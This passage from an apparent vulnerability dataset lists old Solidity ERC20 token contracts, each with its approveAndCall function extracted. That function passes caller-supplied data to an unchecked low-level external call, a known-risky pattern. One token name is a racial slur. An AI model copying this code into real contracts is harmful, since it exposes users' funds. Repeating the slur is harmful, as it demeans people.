allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NiggaToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NiggaToken(\n ) {\n balances[msg.sender] = 1800000000;\n totalSupply = 1800000000;\n name = \"NiggaToken\";\n decimals = 2;\n symbol = \"NIGGA\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1577"
  },
  "filename": "34603.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() public pure returns (uint256 supply) {}\n function balanceOf(address _owner) public constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) public returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}\n function approve(address _spender, uint256 _value) public returns (bool success) {}\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () public {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) public {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"2UP\";\n decimals = 2;\n symbol = \"2UP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1578"
  },
  "filename": "34606.sol",
  "content": "pragma solidity 0.4.18;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract StandardBounties {\n event BountyIssued(uint bountyId);\n event BountyActivated(uint bountyId, address issuer);\n event BountyFulfilled(uint bountyId, address indexed fulfiller, uint256 indexed _fulfillmentId);\n event FulfillmentUpdated(uint _bountyId, uint _fulfillmentId);\n event FulfillmentAccepted(uint bountyId, address indexed fulfiller, uint256 indexed _fulfillmentId);\n event BountyKilled(uint bountyId, address indexed issuer);\n event ContributionAdded(uint bountyId, address indexed contributor, uint256 value);\n event DeadlineExtended(uint bountyId, uint newDeadline);\n event BountyChanged(uint bountyId);\n event IssuerTransferred(uint _bountyId, address indexed _newIssuer);\n event PayoutIncreased(uint _bountyId, uint _newFulfillmentAmount);\n address public owner;\n Bounty[] public bounties;\n mapping(uint=>Fulfillment[]) fulfillments;\n mapping(uint=>uint) numAccepted;\n mapping(uint=>HumanStandardToken) tokenContracts;\n enum BountyStages {\n Draft,\n Active,\n Dead\n }\n struct Bounty {\n address issuer;\n uint deadline;\n string data;\n uint fulfillmentAmount;\n address arbiter;\n bool paysTokens;\n BountyStages bountyStage;\n uint balance;\n }\n struct Fulfillment {\n bool accepted;\n address fulfiller;\n string data;\n }\n modifier validateNotTooManyBounties(){\n require((bounties.length + 1) > bounties.length);\n _;\n }\n modifier validateNotTooManyFulfillments(uint _bountyId){\n require((fulfillments[_bountyId].length + 1) > fulfillments[_bountyId].length);\n _;\n }\n modifier validateBountyArrayIndex(uint _bountyId){\n require(_bountyId < bounties.length);\n _;\n }\n modifier onlyIssuer(uint _bountyId) {\n require(msg.sender == bounties[_bountyId].issuer);\n _;\n }\n modifier onlyFulfiller(uint _bountyId, uint _fulfillmentId) {\n require(msg.sender == fulfillments[_bountyId][_fulfillmentId].fulfiller);\n _;\n }\n modifier amountIsNotZero(uint _amount) {\n require(_amount != 0);\n _;\n }\n modifier transferredAmountEqualsValue(uint _bountyId, uint _amount) {\n if (bounties[_bountyId].paysTokens){\n require(msg.value == 0);\n uint oldBalance = tokenContracts[_bountyId].balanceOf(this);\n if (_amount != 0){\n require(tokenContracts[_bountyId].transferFrom(msg.sender, this, _amount));\n }\n require((tokenContracts[_bountyId].balanceOf(this) - oldBalance) == _amount);\n } else {\n require((_amount * 1 wei) == msg.value);\n }\n _;\n }\n modifier isBeforeDeadline(uint _bountyId) {\n require(now < bounties[_bountyId].deadline);\n _;\n }\n modifier validateDeadline(uint _newDeadline) {\n require(_newDeadline > now);\n _;\n }\n modifier isAtStage(uint _bountyId, BountyStages _desiredStage) {\n require(bounties[_bountyId].bountyStage == _desiredStage);\n _;\n }\n modifier validateFulfillmentArrayIndex(uint _bountyId, uint _index) {\n require(_index < fulfillments[_bountyId].length);\n _;\n }\n modifier notYetAccepted(uint _bountyId, uint _fulfillmentId){\n require(fulfillments[_bountyId][_fulfillmentId].accepted == false);\n _;\n }\n function StandardBounties(address _owner)\n public\n {\n owner = _owner;\n }\n function issueBounty(\n address _issuer,\n uint _deadline,\n string _data,\n uint256 _fulfillmentAmount,\n address _arbiter,\n bool _paysTokens,\n address _tokenContract\n )\n public\n validateDeadline(_deadline)\n amountIsNotZero(_fulfillmentAmount)\n validateNotTooManyBounties\n returns (uint)\n {\n bounties.push(Bounty(_issuer, _deadline, _data, _fulfillmentAmount, _arbiter, _paysTokens, BountyStages.Draft, 0));\n if (_paysTokens){\n tokenContracts[bounties.length - 1] = HumanStandardToken(_tokenContract);\n }\n BountyIssued(bounties.length - 1);\n return (bounties.length - 1);\n }\n function issueAndActivateBounty(\n address _issuer,\n uint _deadline,\n string _data,\n uint256 _fulfillmentAmount,\n address _arbiter,\n bool _paysTokens,\n address _tokenContract,\n uint256 _value\n )\n public\n payable\n validateDeadline(_deadline)\n amountIsNotZero(_fulfillmentAmount)\n validateNotTooManyBounties\n returns (uint)\n {\n require (_value >= _fulfillmentAmount);\n if (_paysTokens){\n require(msg.value == 0);\n tokenContracts[bounties.length] = HumanStandardToken(_tokenContract);\n require(tokenContracts[bounties.length].transferFrom(msg.sender, this, _value));\n } else {\n require((_value * 1 wei) == msg.value);\n }\n bounties.push(Bounty(_issuer,\n _deadline,\n _data,\n _fulfillmentAmount,\n _arbiter,\n _paysTokens,\n BountyStages.Active,\n _value));\n BountyIssued(bounties.length - 1);\n ContributionAdded(bounties.length - 1, msg.sender, _value);\n BountyActivated(bounties.length - 1, msg.sender);\n return (bounties.length - 1);\n }\n modifier isNotDead(uint _bountyId) {\n require(bounties[_bountyId].bountyStage != BountyStages.Dead);\n _;\n }\n function contribute (uint _bountyId, uint _value)\n payable\n public\n validateBountyArrayIndex(_bountyId)\n isBeforeDeadline(_bountyId)\n isNotDead(_bountyId)\n amountIsNotZero(_value)\n transferredAmountEqualsValue(_bountyId, _value)\n {\n bounties[_bountyId].balance += _value;\n ContributionAdded(_bountyId, msg.sender, _value);\n }\n function activateBounty(uint _bountyId, uint _value)\n payable\n public\n validateBountyArrayIndex(_bountyId)\n isBeforeDeadline(_bountyId)\n onlyIssuer(_bountyId)\n transferredAmountEqualsValue(_bountyId, _value)\n {\n bounties[_bountyId].balance += _value;\n require (bounties[_bountyId].balance >= bounties[_bountyId].fulfillmentAmount);\n transitionToState(_bountyId, BountyStages.Active);\n ContributionAdded(_bountyId, msg.sender, _value);\n BountyActivated(_bountyId, msg.sender);\n }\n modifier notIssuerOrArbiter(uint _bountyId) {\n require(msg.sender != bounties[_bountyId].issuer && msg.sender != bounties[_bountyId].arbiter);\n _;\n }\n function fulfillBounty(uint _bountyId, string _data)\n public\n validateBountyArrayIndex(_bountyId)\n validateNotTooManyFulfillments(_bountyId)\n isAtStage(_bountyId, BountyStages.Active)\n isBeforeDeadline(_bountyId)\n notIssuerOrArbiter(_bountyId)\n {\n fulfillments[_bountyId].push(Fulfillment(false, msg.sender, _data));\n BountyFulfilled(_bountyId, msg.sender, (fulfillments[_bountyId].length - 1));\n }\n function updateFulfillment(uint _bountyId, uint _fulfillmentId, string _data)\n public\n validateBountyArrayIndex(_bountyId)\n validateFulfillmentArrayIndex(_bountyId, _fulfillmentId)\n onlyFulfiller(_bountyId, _fulfillmentId)\n notYetAccepted(_bountyId, _fulfillmentId)\n {\n fulfillments[_bountyId][_fulfillmentId].data = _data;\n FulfillmentUpdated(_bountyId, _fulfillmentId);\n }\n modifier onlyIssuerOrArbiter(uint _bountyId) {\n require(msg.sender == bounties[_bountyId].issuer ||\n (msg.sender == bounties[_bountyId].arbiter && bounties[_bountyId].arbiter != address(0)));\n _;\n }\n modifier fulfillmentNotYetAccepted(uint _bountyId, uint _fulfillmentId) {\n require(fulfillments[_bountyId][_fulfillmentId].accepted == false);\n _;\n }\n modifier enoughFundsToPay(uint _bountyId) {\n require(bounties[_bountyId].balance >= bounties[_bountyId].fulfillmentAmount);\n _;\n }\n function acceptFulfillment(uint _bountyId, uint _fulfillmentId)\n public\n validateBountyArrayIndex(_bountyId)\n validateFulfillmentArrayIndex(_bountyId, _fulfillmentId)\n onlyIssuerOrArbiter(_bountyId)\n isAtStage(_bountyId, BountyStages.Active)\n fulfillmentNotYetAccepted(_bountyId, _fulfillmentId)\n enoughFundsToPay(_bountyId)\n {\n fulfillments[_bountyId][_fulfillmentId].accepted = true;\n numAccepted[_bountyId]++;\n bounties[_bountyId].balance -= bounties[_bountyId].fulfillmentAmount;\n if (bounties[_bountyId].paysTokens){\n require(tokenContracts[_bountyId].transfer(fulfillments[_bountyId][_fulfillmentId].fulfiller, bounties[_bountyId].fulfillmentAmount));\n } else {\n fulfillments[_bountyId][_fulfillmentId].fulfiller.transfer(bounties[_bountyId].fulfillmentAmount);\n }\n FulfillmentAccepted(_bountyId, msg.sender, _fulfillmentId);\n }\n function killBounty(uint _bountyId)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n {\n transitionToState(_bountyId, BountyStages.Dead);\n uint oldBalance = bounties[_bountyId].balance;\n bounties[_bountyId].balance = 0;\n if (oldBalance > 0){\n if (bounties[_bountyId].paysTokens){\n require(tokenContracts[_bountyId].transfer(bounties[_bountyId].issuer, oldBalance));\n } else {\n bounties[_bountyId].issuer.transfer(oldBalance);\n }\n }\n BountyKilled(_bountyId, msg.sender);\n }\n modifier newDeadlineIsValid(uint _bountyId, uint _newDeadline) {\n require(_newDeadline > bounties[_bountyId].deadline);\n _;\n }\n function extendDeadline(uint _bountyId, uint _newDeadline)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n newDeadlineIsValid(_bountyId, _newDeadline)\n {\n bounties[_bountyId].deadline = _newDeadline;\n DeadlineExtended(_bountyId, _newDeadline);\n }\n function transferIssuer(uint _bountyId, address _newIssuer)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n {\n bounties[_bountyId].issuer = _newIssuer;\n IssuerTransferred(_bountyId, _newIssuer);\n }\n function changeBountyDeadline(uint _bountyId, uint _newDeadline)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n validateDeadline(_newDeadline)\n isAtStage(_bountyId, BountyStages.Draft)\n {\n bounties[_bountyId].deadline = _newDeadline;\n BountyChanged(_bountyId);\n }\n function changeBountyData(uint _bountyId, string _newData)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n isAtStage(_bountyId, BountyStages.Draft)\n {\n bounties[_bountyId].data = _newData;\n BountyChanged(_bountyId);\n }\n function changeBountyFulfillmentAmount(uint _bountyId, uint _newFulfillmentAmount)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n isAtStage(_bountyId, BountyStages.Draft)\n {\n bounties[_bountyId].fulfillmentAmount = _newFulfillmentAmount;\n BountyChanged(_bountyId);\n }\n function changeBountyArbiter(uint _bountyId, address _newArbiter)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n isAtStage(_bountyId, BountyStages.Draft)\n {\n bounties[_bountyId].arbiter = _newArbiter;\n BountyChanged(_bountyId);\n }\n function changeBountyPaysTokens(uint _bountyId, bool _newPaysTokens, address _newTokenContract)\n public\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n isAtStage(_bountyId, BountyStages.Draft)\n {\n HumanStandardToken oldToken = tokenContracts[_bountyId];\n bool oldPaysTokens = bounties[_bountyId].paysTokens;\n bounties[_bountyId].paysTokens = _newPaysTokens;\n tokenContracts[_bountyId] = HumanStandardToken(_newTokenContract);\n if (bounties[_bountyId].balance > 0){\n uint oldBalance = bounties[_bountyId].balance;\n bounties[_bountyId].balance = 0;\n if (oldPaysTokens){\n require(oldToken.transfer(bounties[_bountyId].issuer, oldBalance));\n } else {\n bounties[_bountyId].issuer.transfer(oldBalance);\n }\n }\n BountyChanged(_bountyId);\n }\n modifier newFulfillmentAmountIsIncrease(uint _bountyId, uint _newFulfillmentAmount) {\n require(bounties[_bountyId].fulfillmentAmount < _newFulfillmentAmount);\n _;\n }\n function increasePayout(uint _bountyId, uint _newFulfillmentAmount, uint _value)\n public\n payable\n validateBountyArrayIndex(_bountyId)\n onlyIssuer(_bountyId)\n newFulfillmentAmountIsIncrease(_bountyId, _newFulfillmentAmount)\n transferredAmountEqualsValue(_bountyId, _value)\n {\n bounties[_bountyId].balance += _value;\n require(bounties[_bountyId].balance >= _newFulfillmentAmount);\n bounties[_bountyId].fulfillmentAmount = _newFulfillmentAmount;\n PayoutIncreased(_bountyId, _newFulfillmentAmount);\n }\n function getFulfillment(uint _bountyId, uint _fulfillmentId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n validateFulfillmentArrayIndex(_bountyId, _fulfillmentId)\n returns (bool, address, string)\n {\n return (fulfillments[_bountyId][_fulfillmentId].accepted,\n fulfillments[_bountyId][_fulfillmentId].fulfiller,\n fulfillments[_bountyId][_fulfillmentId].data);\n }\n function getBounty(uint _bountyId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n returns (address, uint, uint, bool, uint, uint)\n {\n return (bounties[_bountyId].issuer,\n bounties[_bountyId].deadline,\n bounties[_bountyId].fulfillmentAmount,\n bounties[_bountyId].paysTokens,\n uint(bounties[_bountyId].bountyStage),\n bounties[_bountyId].balance);\n }\n function getBountyArbiter(uint _bountyId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n returns (address)\n {\n return (bounties[_bountyId].arbiter);\n }\n function getBountyData(uint _bountyId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n returns (string)\n {\n return (bounties[_bountyId].data);\n }\n function getBountyToken(uint _bountyId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n returns (address)\n {\n return (tokenContracts[_bountyId]);\n }\n function getNumBounties()\n public\n constant\n returns (uint)\n {\n return bounties.length;\n }\n function getNumFulfillments(uint _bountyId)\n public\n constant\n validateBountyArrayIndex(_bountyId)\n returns (uint)\n {\n return fulfillments[_bountyId].length;\n }\n function transitionToState(uint _bountyId, BountyStages _newStage)\n internal\n {\n bounties[_bountyId].bountyStage = _newStage;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1579"
  },
  "filename": "34629.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 150000000000000;\n totalSupply = 150000000000000;\n name = \"Ethereum Trust\";\n decimals = 8;\n symbol = \"Etht\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157a"
  },
  "filename": "34648.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157b"
  },
  "filename": "34659.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EIDOO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EIDOO(\n ) {\n balances[msg.sender] = 60000;\n totalSupply = 60000;\n name = \"EIDOO\";\n decimals = 18;\n symbol = \"EDO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb157c"
  },
  "filename": "34660.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 50000;\n totalSupply = 60000;\n name = \"EIDOO\";\n decimals = 0;\n symbol = \"EDO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
